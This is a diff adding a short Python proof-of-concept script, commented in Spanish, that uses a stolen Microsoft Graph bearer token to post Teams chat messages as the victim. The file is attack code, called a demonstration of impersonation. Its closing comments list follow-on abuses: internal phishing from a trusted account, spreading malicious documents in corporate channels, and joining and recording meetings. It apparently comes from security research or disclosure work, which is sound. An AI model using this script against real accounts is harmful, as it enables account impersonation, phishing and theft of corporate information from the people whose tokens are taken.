@@ -1,0 +1,34 @@
+"""
+teams_impersonation.py -- Envio de mensajes como la victima
+Demuestra la capacidad de suplantacion via token robado.
+NOTA: En el PoC se envia un mensaje benigno al propio usuario.
+"""
+import requests
+
+def send_message_as_victim(auth_token, chat_id, message):
+    """Enviar un mensaje en nombre de la victima."""
+    headers = {
+        "Authorization": f"Bearer {auth_token}",
+        "Content-Type": "application/json"
+    }
+
+    url = f"https://graph.microsoft.com/v1.0/chats/{chat_id}/messages"
+    payload = {
+        "body": {
+            "contentType": "text",
+            "content": message
+        }
+    }
+
+    response = requests.post(
+        url, headers=headers,
+        json=payload, timeout=10
+    )
+    return response.status_code == 201
+
+# En el PoC: se envia un mensaje al propio usuario
+# como prueba de concepto de la suplantacion.
+# Un atacante real podria:
+# - Enviar phishing interno desde una cuenta de confianza
+# - Compartir documentos maliciosos en canales corporativos
+# - Unirse a reuniones y grabar contenido
